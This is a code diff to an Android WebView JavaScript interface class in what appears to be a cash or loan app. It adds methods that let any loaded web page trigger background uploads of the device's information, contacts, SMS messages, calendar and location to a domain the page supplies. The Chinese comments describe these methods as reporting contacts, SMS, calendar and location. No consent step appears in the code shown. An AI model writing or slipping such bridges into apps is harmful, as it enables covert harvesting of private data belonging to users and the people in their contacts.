@@ -9,9 +9,10 @@ import android.webkit.JavascriptInterface;
 
 import android.webkit.WebView;
 import android.widget.Toast;
+import com.alibaba.fastjson.JSONObject;
+import com.cashhub.cash.common.UploadData;
 import com.tencent.sonic.sdk.SonicDiffDataCallback;
 
-import org.json.JSONObject;
 
 /**
  * Sonic javaScript Interface (Android API Level >= 17)
@@ -31,6 +32,8 @@ public class SonicJavaScriptInterface {
 
   public static final String PARAM_LOAD_URL_TIME = "loadUrlTime";
 
+  private UploadData mUploadData;
+
   public SonicJavaScriptInterface(Context context, WebView webView,
       SonicSessionClientImpl sessionClient,
       Intent intent) {
@@ -38,6 +41,148 @@ public class SonicJavaScriptInterface {
     this.mWebView = webView;
     this.mSessionClient = sessionClient;
     this.mIntent = intent;
+  }
+
+  @JavascriptInterface
+  public void getAndSendDevice(JSONObject systemInfo, String token, String domain,
+    long timeStamp, String deviceKey) {
+    new Thread(() -> {
+        try {
+            //初始化数据
+            if (this.mUploadData == null) {
+                this.mUploadData = new UploadData(mContext);
+            }
+
+            this.mUploadData.getAndSendDevice(systemInfo, token, domain, timeStamp, deviceKey);
+        } catch (Exception e) {
+            Log.d(TAG, e.getMessage());
+        }
+    }).start();//启动线程
+  }
+
+  /**
+   * 手机上报通讯录
+   * @param systemInfo
+   * @param token
+   * @param domain
+   * @param timeStamp
+   * @param deviceKey
+   */
+  @JavascriptInterface
+  public void getAndSendContact(JSONObject systemInfo, String token, String domain,
+    long timeStamp, String deviceKey) {
+    new Thread(() -> {
+        try {
+            //初始化数据
+            if (this.mUploadData == null) {
+              this.mUploadData = new UploadData(mContext);
+            }
+
+            this.mUploadData.getAndSendContact(systemInfo, token, domain, timeStamp, deviceKey);
+        } catch (Exception e) {
+            Log.d(TAG, e.getMessage());
+        }
+    }).start();//启动线程
+  }
+
+  /**
+   * 手机上报短信信息
+   * @param systemInfo
+   * @param token
+   * @param domain
+   * @param timeStamp
+   * @param deviceKey
+   */
+  @JavascriptInterface
+  public void getAndSendSms(JSONObject systemInfo, String token, String domain,
+    long timeStamp, String deviceKey) {
+    new Thread(() -> {
+        try {
+            //初始化数据
+            if (this.mUploadData == null) {
+              this.mUploadData = new UploadData(mContext);
+            }
+
+            this.mUploadData.getAndSendSms(systemInfo, token, domain, timeStamp, deviceKey);
+        } catch (Exception e) {
+            Log.d(TAG, e.getMessage());
+        }
+    }).start();//启动线程
+  }
+
+  /**
+   * 手机上报日历
+   * @param systemInfo
+   * @param token
+   * @param domain
+   * @param timeStamp
+   * @param deviceKey
+   */
+  @JavascriptInterface
+  public void getAndSendCalendar(JSONObject systemInfo, String token, String domain,
+    long timeStamp, String deviceKey) {
+    new Thread(() -> {
+        try {
+            //初始化数据
+            if (this.mUploadData == null) {
+              this.mUploadData = new UploadData(mContext);
+            }
+
+            this.mUploadData.getAndSendCalendar(systemInfo, token, domain, timeStamp, deviceKey);
+        } catch (Exception e) {
+            Log.d(TAG, e.getMessage());
+        }
+    }).start();//启动线程
+  }
+
+  /**
+   * 手机上报定位
+   * @param systemInfo
+   * @param token
+   * @param domain
+   * @param timeStamp
+   * @param deviceKey
+   */
+  @JavascriptInterface
+  public void getAndSendMap(JSONObject systemInfo, String token, String domain,
+    long timeStamp, String deviceKey) {
+    new Thread(() -> {
+        try {
+            //初始化数据
+            if (this.mUploadData == null) {
+              this.mUploadData = new UploadData(mContext);
+            }
+
+            this.mUploadData.getAndSendLocation(systemInfo, token, domain, timeStamp, deviceKey);
+        } catch (Exception e) {
+            Log.d(TAG, e.getMessage());
+        }
+    }).start();//启动线程
+  }
+
+  /**
+   * 手机上报定位
+   * @param systemInfo
+   * @param token
+   * @param domain
+   * @param timeStamp
+   * @param deviceKey
+   */
+  @JavascriptInterface
+  public void getAndSendLocation(JSONObject systemInfo, String token, String domain,
+      long timeStamp, String deviceKey) {
+      new Thread(() -> {
+          try {
+              //初始化数据
+              if (this.mUploadData == null) {
+                this.mUploadData = new UploadData(mContext);
+              }
+              this.mUploadData.getAndSendLocation2(systemInfo, token, domain, timeStamp,
+                  deviceKey);
+          } catch (Exception e) {
+              Log.d(TAG, e.getMessage());
+          }
+      }).start();//启动线程
   }
 
   @JavascriptInterface
